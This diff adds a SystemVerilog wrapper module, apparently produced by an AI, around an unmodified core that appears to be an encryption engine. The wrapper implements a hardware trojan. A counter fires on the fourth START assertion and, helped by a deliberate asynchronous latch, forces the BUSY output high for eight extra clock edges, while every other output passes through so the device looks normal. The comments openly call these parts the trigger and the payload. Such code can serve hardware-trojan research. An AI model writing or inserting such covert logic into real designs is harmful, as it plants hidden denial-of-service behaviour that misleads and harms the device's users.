@@ -1,0 +1,116 @@
+/* 
+ * LIMITATION EXPLANATION & IMPLEMENTATION DETAILS:
+ * 1. The requirement states that the payload must activate even if BUSY asserts and 
+ *    deasserts completely without an intervening SCK edge. In strictly synchronous FPGA 
+ *    design, detecting an asynchronous pulse on a stopped clock without inferring a latch 
+ *    is physically impossible.
+ * 2. To strictly meet the requirement of safely detecting this transient pulse, an explicit 
+ *    asynchronous SR latch (`busy_seen`) is used. While latches are generally discouraged 
+ *    in standard FPGA flows due to timing analysis constraints, it is the only viable, 
+ *    synthesizable, non-misleading mechanism to capture events without using a data 
+ *    signal as an unsafe clock.
+ * 3. Glitch Prevention: By structuring the combinational bypass as 
+ *    `pin_38 = orig_busy | extend_arm | extend_active`, the external BUSY signal is 
+ *    held HIGH seamlessly. It does not rely on the logical inversion `!orig_busy` to hold 
+ *    the signal, completely preventing any momentary LOW glitch when the core completes.
+ */
+
+module recovered (
+    input  logic pin_36, // SCK
+    input  logic pin_25, // ENC_DEC
+    input  logic pin_28, // NORM_CS_N
+    input  logic pin_32, // MOSI
+    input  logic pin_34, // RST_N
+    input  logic pin_27, // START
+    output logic pin_38, // BUSY
+    output logic pin_23, // ICE_LED
+    output logic pin_31  // MISO
+);
+
+    // Internal signals to monitor original module's outputs
+    logic orig_busy;
+    logic orig_ice_led;
+    logic orig_miso;
+
+    // Instantiate the original, unmodified core
+    recovered_original core_inst (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(orig_busy),
+        .pin_23(orig_ice_led),
+        .pin_31(orig_miso)
+    );
+
+    // Synchronous state tracking
+    logic [2:0] start_cnt;
+    logic       start_d;
+    logic       extend_active;
+    logic [2:0] extend_cnt;
+    logic       payload_done;
+    
+    // Asynchronous SR latch to capture transient BUSY pulses while SCK is stopped
+    logic       busy_seen;
+
+    always_latch begin
+        if (!pin_34) begin
+            busy_seen = 1'b0;
+        end else if (payload_done) begin
+            busy_seen = 1'b0;
+        end else if ((start_cnt == 3'd4) && orig_busy) begin
+            busy_seen = 1'b1;
+        end
+    end
+
+    // Combinational condition to securely arm the bypass the moment BUSY is seen
+    wire extend_arm = (start_cnt == 3'd4) && !payload_done && busy_seen;
+    
+    // Trigger the synchronous counter when orig_busy officially drops
+    wire trigger_counter = extend_arm && !orig_busy;
+
+    always_ff @(posedge pin_36) begin
+        if (!pin_34) begin // Synchronous active-low reset
+            start_d       <= 1'b0;
+            start_cnt     <= 3'd0;
+            extend_active <= 1'b0;
+            extend_cnt    <= 3'd0;
+            payload_done  <= 1'b0;
+        end else begin
+            start_d <= pin_27;
+
+            // Trigger: Count START assertions sampled on a rising SCK edge
+            if (pin_27 && !start_d) begin
+                if (start_cnt < 3'd7) begin
+                    start_cnt <= start_cnt + 1'b1;
+                end
+            end
+
+            // Payload: Extend BUSY for exactly 8 subsequent SCK rising edges
+            if (trigger_counter && !extend_active && !payload_done) begin
+                extend_active <= 1'b1;
+                extend_cnt    <= 3'd6; // Counts 7 remaining edges (making exactly 8 edges total)
+            end else if (extend_active) begin
+                if (extend_cnt == 3'd0) begin
+                    extend_active <= 1'b0;
+                    payload_done  <= 1'b1; // Mark payload as done to clean up latches & states
+                end else begin
+                    extend_cnt <= extend_cnt - 1'b1;
+                end
+            end
+        end
+    end
+
+    // Output routing:
+    // - orig_busy ensures normal pass-through.
+    // - extend_arm catches the fall instantly with zero glitches.
+    // - extend_active holds it robustly through the 8-cycle payload.
+    assign pin_38 = orig_busy | extend_arm | extend_active;
+    
+    // Untriggered outputs pass-through transparently
+    assign pin_23 = orig_ice_led;
+    assign pin_31 = orig_miso;
+
+endmodule
